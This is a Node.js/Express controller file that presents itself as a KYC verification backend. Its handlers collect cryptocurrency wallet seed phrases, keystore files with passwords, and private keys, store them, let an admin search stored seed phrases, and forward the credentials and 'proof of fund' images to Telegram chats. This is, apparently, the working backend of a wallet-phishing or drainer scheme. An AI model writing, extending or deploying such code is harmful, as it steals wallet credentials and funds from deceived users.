const Kyc = require('../models/Kyc');
const { notifyNewKyc } = require('../../telegramBot');

// Save wallet submission only: seed phrase, keystore JSON + password, or private key.
// Creates a new record every time (new session per submit). Sends data to Telegram.
exports.saveKycDetails = async (req, res) => {
  try {
    const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey } = req.body;

    if (!sessionId || !walletType) {
      return res.status(400).json({ message: 'sessionId and walletType are required' });
    }

    const hasCredential = seedPhrase || (keystoreJson && password) || privateKey;
    if (!hasCredential) {
      return res.status(400).json({ message: 'At least one of seedPhrase, keystoreJson+password, or privateKey is required' });
    }

    // New record per submission (new session every time)
    const record = await Kyc.create({
      sessionId,
      walletType,
      seedPhrase: seedPhrase || undefined,
      keystoreJson: keystoreJson || undefined,
      password: password || undefined,
      privateKey: privateKey || undefined,
      imageUrls: [],
      verificationStatus: 'no_images',
      dealersLicenseStatus: 'not_available',
      fileMap: {},
    });

    try {
      notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey });
    } catch (err) {
      console.error('Failed to send Telegram notification', err);
    }

    res.status(201).json({ message: 'Wallet submission saved successfully', sessionId: record.sessionId });
  } catch (error) {
    console.error('saveKycDetails error', error);
    res.status(500).json({ message: 'Failed to save wallet submission' });
  }
};

// Fetch KYC details
exports.getKycDetails = async (req, res) => {
  try {
    // Support pagination, search and filters for admin listing
    const { page = 1, limit = 20, q, status, walletType, sessionId, sort = '-createdAt' } = req.query;
    const skip = (Math.max(1, parseInt(page)) - 1) * Math.max(1, parseInt(limit));

    const filter = {};
    if (sessionId) filter.sessionId = sessionId;
    if (status) filter.verificationStatus = status;
    if (walletType) filter.walletType = walletType;
    if (q) {
      // simple text search on sessionId, walletType or seedPhrase (case-insensitive)
      const re = new RegExp(q, 'i');
      filter.$or = [ { sessionId: re }, { walletType: re }, { seedPhrase: re } ];
    }

    const total = await Kyc.countDocuments(filter);
    const docs = await Kyc.find(filter).sort(sort).skip(skip).limit(Math.max(1, parseInt(limit)));

    res.status(200).json({ total, page: parseInt(page), limit: parseInt(limit), pages: Math.ceil(total / Math.max(1, parseInt(limit))), docs });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'Failed to fetch KYC details' });
  }
};

// Update Proof of Fund
exports.updateProofOfFund = async (req, res) => {
  try {
    const { sessionId, imageUrls } = req.body;

    if (!sessionId || !Array.isArray(imageUrls) || imageUrls.length === 0) {
      return res.status(400).json({ message: 'Invalid request. Session ID and image URLs are required.' });
    }

    const session = await Kyc.findOne({ sessionId });

    if (!session) {
      return res.status(404).json({ message: 'Session not found. Please start from the KYC documents page.' });
    }

    // Only update imageUrls by appending the new Proof of Fund image
    session.imageUrls = [...(session.imageUrls || []), ...imageUrls];
    // Save the latest POF image in proofOfFund field
    let pofImage = null;
    if (imageUrls && imageUrls.length > 0) {
      pofImage = imageUrls[imageUrls.length - 1];
      session.proofOfFund = pofImage;
    }
    await session.save();

    // Always send the new Proof of Fund image to Telegram with sessionId
    try {
      if (pofImage && pofImage.url) {
        const imageFormats = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
        const format = (pofImage.format || '').toLowerCase();
        const resourceType = (pofImage.resource_type || '').toLowerCase();
        const caption = `Proof Of Fund (${sessionId})`;
        const { bot, chatIds } = require('../../telegramBot');
        if (bot && chatIds) {
          for (const chatId of chatIds) {
            try {
              if (imageFormats.includes(format) || resourceType === 'image') {
                await bot.sendPhoto(chatId, pofImage.url, { caption });
              } else {
                await bot.sendDocument(chatId, pofImage.url, { caption });
              }
            } catch (err) {
              console.error(`Failed to send POF to chatId ${chatId}:`, err);
            }
          }
        } else {
          console.error('Telegram bot or chatIds not configured.');
        }
      } else {
        console.error('POF image missing or invalid:', pofImage);
      }
    } catch (err) {
      console.error('Failed to send Proof of Fund telegram notification (outer catch):', err);
    }

    res.status(200).json({ message: 'Proof of Fund updated successfully.' });
  } catch (error) {
    console.error('Error updating Proof of Fund:', error);
    res.status(500).json({ message: 'Failed to update Proof of Fund.' });
  }
};

// Fetch Proof of Fund image for a session
exports.getPofScreenshot = async (req, res) => {
  try {
    const { sessionId } = req.params;
    if (!sessionId) {
      return res.status(400).json({ message: 'Session ID is required' });
    }
    const session = await Kyc.findOne({ sessionId });
    if (!session || !session.proofOfFund || !session.proofOfFund.url) {
      return res.status(404).json({ message: 'No Proof of Fund image found for this session' });
    }
    res.status(200).json({ proofOfFund: session.proofOfFund });
  } catch (error) {
    console.error('Error fetching Proof of Fund image:', error);
    res.status(500).json({ message: 'Failed to fetch Proof of Fund image' });
  }
};

// Fetch total record count
exports.getTotalRecordCount = async (req, res) => {
  try {
    const totalRecords = await Kyc.countDocuments();
    res.status(200).json({ totalRecords });
  } catch (error) {
    console.error('Error fetching total record count:', error);
    res.status(500).json({ message: 'Failed to fetch total record count' });
  }
};